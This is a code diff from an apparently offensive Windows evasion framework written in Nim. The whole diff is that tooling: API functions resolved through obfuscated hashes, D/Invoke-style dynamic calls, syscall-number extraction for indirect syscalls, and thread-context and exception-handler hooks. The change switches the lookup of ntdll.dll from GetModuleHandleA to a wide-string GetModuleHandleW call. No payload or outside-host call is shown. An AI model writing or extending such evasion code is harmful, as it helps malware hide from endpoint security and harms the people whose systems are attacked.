@@ -14,6 +14,7 @@ type
   GetProcAddress_t* = proc (hModule: HMODULE, lpProcName: LPCSTR): FARPROC {.stdcall.}
   RtlAddVectoredExceptionHandler_t* = proc (First: ULONG, Handler: PVECTORED_EXCEPTION_HANDLER): PVOID {.stdcall.}
   GetModuleHandleA_t* = proc (lpModuleName: LPCSTR): HMODULE {.stdcall.}
+  GetModuleHandleW_t* = proc (lpModuleName: LPCWSTR): HMODULE {.stdcall.}
   GetThreadContext_t* = proc (hThread: HANDLE, lpContext: LPCONTEXT): WINBOOL {.stdcall.}
   SetThreadContext_t* = proc (hThread: HANDLE, lpContext: LPCONTEXT): WINBOOL {.stdcall.}
   CloseHandle_t* = proc (hObject: HANDLE): WINBOOL {.stdcall.}
@@ -35,6 +36,7 @@ const
   GetProcAddress_HASH * = obf("GetProcAddress")
   RtlAddVectoredExceptionHandler_HASH * = obf("RtlAddVectoredExceptionHandler")
   GetModuleHandleA_HASH * = obf("GetModuleHandleA")
+  GetModuleHandleW_HASH * = obf("GetModuleHandleW")
   GetThreadContext_HASH * = obf("GetThreadContext")
   SetThreadContext_HASH * = obf("SetThreadContext")
   CloseHandle_HASH * = obf("CloseHandle")
@@ -55,6 +57,7 @@ var MyGetProcessHeap*: GetProcessHeap_t
 var MyGetProcAddress*: GetProcAddress_t
 var MyRtlAddVectoredExceptionHandler*: RtlAddVectoredExceptionHandler_t
 var MyGetModuleHandleA*: GetModuleHandleA_t
+var MyGetModuleHandleW*: GetModuleHandleW_t
 var MyGetThreadContext*: GetThreadContext_t
 var MySetThreadContext*: SetThreadContext_t
 var MyCloseHandle*: CloseHandle_t
@@ -82,6 +85,8 @@ MyGetProcAddress = cast[GetProcAddress_t](cast[LPVOID](get_function_address(cast
 MyRtlAddVectoredExceptionHandler = cast[RtlAddVectoredExceptionHandler_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, TRUE)), RtlAddVectoredExceptionHandler_HASH, 0, TRUE)))
 
 MyGetModuleHandleA = cast[GetModuleHandleA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleHandleA_HASH, 0, FALSE)))
+
+MyGetModuleHandleW = cast[GetModuleHandleW_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleHandleW_HASH, 0, FALSE)))
 
 MyGetThreadContext = cast[GetThreadContext_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetThreadContext_HASH, 0, FALSE)))
 
@@ -339,17 +344,19 @@ when defined(GetSyscallStub):
                 when defined(verbose):
                     echo obf("[*] Got SSN: ") & toHex(indirect_syscall[4]) & toHex(indirect_syscall[5]) & toHex(indirect_syscall[6]) & toHex(indirect_syscall[7])
                 # GetModuleHandleA for ntdll
+                var ntdllwideString = obf("ntdll.dll")
+                var widentdll: WideCString = newWideCString(ntdllwideString)
                 when defined(DInvoke):
-                  var hModule: HMODULE = cast[HMODULE](MyGetModuleHandleA(ntdllString))
+                  var hModule: HMODULE = cast[HMODULE](MyGetModuleHandleW(cast[LPCWSTR](widentdll)))
                 else:
-                  var hModule: HMODULE = GetModuleHandleA(ntdllString)
+                  var hModule: HMODULE = GetModuleHandleW(cast[LPCWSTR](widentdll))
 
                 when defined(verbose):
                     if (hModule == 0):
-                        echo obf("[*] GetModuleHandleA Error Code: ") & $[GetLastError()]
+                        echo obf("[*] GetModuleHandleW Error Code: ") & $[GetLastError()]
                         return 0
                     else:
-                        echo obf("[*] GetModuleHandleA Success")
+                        echo obf("[*] GetModuleHandleW Success")
                 
                 # GetProcAddress for functionName
                 when defined(DInvoke):
